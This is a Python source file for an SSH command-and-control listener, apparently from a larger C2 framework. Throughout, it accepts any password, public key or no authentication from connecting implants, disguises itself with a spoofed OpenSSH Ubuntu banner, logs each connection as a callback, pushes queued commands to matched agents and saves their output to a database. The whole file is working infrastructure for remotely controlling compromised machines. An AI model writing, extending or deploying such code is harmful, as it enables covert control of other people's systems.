"""
SSH C2 Listener — paramiko-based SSH server.

Each connecting client is recorded as a Callback.  The server supports
password and publickey authentication (accept-all for implant use).
Commands queued for the connecting agent are served over an interactive
channel; results are written back to the C2 database.

Configuration keys (extra_config):
  ssh_host_key_path  – path to an existing RSA/DSA/ECDSA host key PEM file.
                        If omitted, an ephemeral RSA-2048 key is generated.
  ssh_banner         – custom SSH banner string (default: OpenSSH_8.9p1)
  ssh_auth_method    – "password" | "publickey" | "any" (default: any)
"""

import io
import json
import logging
import socket
import threading
import time
from datetime import datetime, timezone

logger = logging.getLogger(__name__)


def _utcnow():
    return datetime.now(timezone.utc)


def _load_or_generate_host_key(path: str | None):
    """Return a paramiko RSAKey, loaded from *path* or freshly generated."""
    import paramiko

    if path:
        try:
            return paramiko.RSAKey(filename=path)
        except Exception as exc:
            logger.warning("Failed to load SSH host key from %s: %s — generating ephemeral key", path, exc)

    logger.info("Generating ephemeral RSA-2048 SSH host key")
    return paramiko.RSAKey.generate(2048)


class _C2ServerInterface(object):
    """Paramiko ServerInterface that records connections and serves C2 tasks."""

    def __init__(self, listener_id: int, flask_app, source_ip: str, source_port: int):
        self.listener_id = listener_id
        self.flask_app = flask_app
        self.source_ip = source_ip
        self.source_port = source_port
        self.username: str = ""
        self.agent_id: str | None = None
        self._event = threading.Event()

    # -- Authentication --------------------------------------------------

    def check_auth_password(self, username, password):
        import paramiko
        self.username = username
        logger.debug("SSH auth attempt user=%s from %s (password)", username, self.source_ip)
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        import paramiko
        self.username = username
        logger.debug("SSH auth attempt user=%s from %s (pubkey)", username, self.source_ip)
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_none(self, username):
        import paramiko
        self.username = username
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "password,publickey,none"

    # -- Channel / session -----------------------------------------------

    def check_channel_request(self, kind, chanid):
        import paramiko
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel):
        self._event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        self._event.set()
        return True


def _handle_ssh_session(transport, server_iface: _C2ServerInterface):
    """Wait for channel open and serve queued C2 tasks."""
    import paramiko
    from models import db, Callback, Agent, AgentTask

    flask_app = server_iface.flask_app

    try:
        transport.start_server(server=server_iface)
        chan = transport.accept(20)
        if chan is None:
            logger.debug("SSH: no channel opened from %s", server_iface.source_ip)
            return

        # Record callback
        with flask_app.app_context():
            try:
                cb = Callback(
                    listener_id=server_iface.listener_id,
                    source_ip=server_iface.source_ip,
                    source_port=server_iface.source_port,
                    hostname=server_iface.username or None,
                    user_agent=f"SSH/{server_iface.username}",
                    request_method="SSH",
                    request_path="/",
                    request_headers=json.dumps({}),
                    request_body=None,
                    timestamp=_utcnow(),
                )
                db.session.add(cb)
                db.session.commit()
            except Exception:
                logger.exception("SSH: failed to record callback")
                try:
                    db.session.rollback()
                except Exception:
                    pass

        server_iface._event.wait(10)

        # Simple task-dispatch loop: send queued tasks, read results
        with flask_app.app_context():
            # Try to match an existing agent by username@source_ip
            agent = Agent.query.filter_by(
                username=server_iface.username,
                internal_ip=server_iface.source_ip,
            ).first()

            if agent:
                agent.last_seen = _utcnow()
                agent.status = "active"
                db.session.commit()

                tasks = AgentTask.query.filter_by(
                    agent_id=agent.id, status="queued"
                ).order_by(AgentTask.created_at.asc()).all()

                for task in tasks:
                    try:
                        chan.sendall((task.command + "\n").encode())
                        task.status = "sent"
                        task.sent_at = _utcnow()
                        db.session.commit()
                    except Exception as exc:
                        logger.warning("SSH: failed to send task %s: %s", task.id, exc)
                        break

                # Read any output that comes back (up to 60 s)
                output_buf = b""
                chan.settimeout(5.0)
                deadline = time.monotonic() + 60
                while time.monotonic() < deadline:
                    try:
                        chunk = chan.recv(4096)
                        if not chunk:
                            break
                        output_buf += chunk
                    except socket.timeout:
                        break
                    except Exception:
                        break

                # Save output to the last sent task
                if output_buf:
                    sent_tasks = AgentTask.query.filter_by(
                        agent_id=agent.id, status="sent"
                    ).order_by(AgentTask.sent_at.asc()).all()
                    for task in sent_tasks:
                        task.result = output_buf.decode(errors="replace")[:50_000]
                        task.success = True
                        task.status = "completed"
                        task.completed_at = _utcnow()
                    db.session.commit()

        chan.close()
    except Exception:
        logger.exception("SSH session error for %s", server_iface.source_ip)
    finally:
        try:
            transport.close()
        except Exception:
            pass


class SSHListenerThread(threading.Thread):
    """Accept loop for the SSH listener."""

    def __init__(self, sock: socket.socket, listener_id: int, flask_app,
                 host_key, banner: str):
        super().__init__(daemon=True, name=f"ssh-listener-{listener_id}")
        self._sock = sock
        self._listener_id = listener_id
        self._flask_app = flask_app
        self._host_key = host_key
        self._banner = banner
        self._stop_event = threading.Event()

    def run(self):
        import paramiko

        self._sock.listen(8)
        logger.info("SSH listener %s accepting connections", self._listener_id)

        while not self._stop_event.is_set():
            try:
                self._sock.settimeout(1.0)
                try:
                    client_sock, addr = self._sock.accept()
                except socket.timeout:
                    continue

                source_ip, source_port = addr[0], addr[1]
                logger.debug("SSH: new connection from %s:%s", source_ip, source_port)

                transport = paramiko.Transport(client_sock)
                transport.add_server_key(self._host_key)
                if self._banner:
                    transport.local_version = self._banner

                server_iface = _C2ServerInterface(
                    self._listener_id, self._flask_app, source_ip, source_port
                )

                t = threading.Thread(
                    target=_handle_ssh_session,
                    args=(transport, server_iface),
                    daemon=True,
                )
                t.start()

            except Exception:
                if not self._stop_event.is_set():
                    logger.exception("SSH listener accept error")

        try:
            self._sock.close()
        except Exception:
            pass
        logger.info("SSH listener %s stopped", self._listener_id)

    def shutdown(self):
        self._stop_event.set()


def start_ssh_listener(listener_row, flask_app) -> "SSHListenerThread":
    """Create and start an SSHListenerThread for *listener_row*."""
    extra: dict = {}
    try:
        extra = json.loads(listener_row.extra_config or "{}") or {}
    except (ValueError, TypeError):
        pass

    host_key = _load_or_generate_host_key(extra.get("ssh_host_key_path"))
    banner = extra.get("ssh_banner", "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((listener_row.bind_address, listener_row.bind_port))

    thread = SSHListenerThread(
        sock=sock,
        listener_id=listener_row.id,
        flask_app=flask_app,
        host_key=host_key,
        banner=banner,
    )
    thread.start()
    return thread
